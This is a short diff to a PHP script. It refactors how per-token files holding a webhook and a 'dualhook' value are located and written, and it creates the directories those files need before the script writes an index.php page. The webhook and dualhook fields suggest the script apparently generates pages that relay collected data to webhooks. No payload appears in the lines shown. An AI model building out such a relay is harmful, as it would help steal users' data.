@@ -16,9 +16,8 @@ if (!$token) {
     exit();
 }
 
-$tokenFile = hb_tokens_dir() . $token . '.txt';
-$dualhook = '';
-if (file_exists($tokenFile)) {
+$tokenFile = hb_find_token_file($token);
+if ($tokenFile) {
     $contents = file_get_contents($tokenFile);
     $data = array_map('trim', explode("|", $contents));
     if (count($data) >= 3) {
@@ -30,6 +29,7 @@ if (file_exists($tokenFile)) {
     }
 } else {
     $web = "No webhook found";
+    $tokenFile = hb_tokens_dir() . $token . '.txt';
 }
 
 $dir = $_SESSION['dir'];
@@ -161,6 +161,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                 $dir = $newDirectory;
                 $_SESSION['dir'] = $dir;
                 // Update token file with current webhook and dualhook
+                hb_ensure_dir(dirname($tokenFile));
                 file_put_contents($tokenFile, "$token | $dir | $web | " . ($dualhook ?? '') . " | " . time());
             }
             
@@ -226,6 +227,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             }
             
             // Update token file with new webhook and dualhook
+            hb_ensure_dir(dirname($tokenFile));
             $fo = fopen($path . "index.php", 'w');
             $fo2 = fopen($tokenFile, 'w');
             if ($fo && $fo2) {
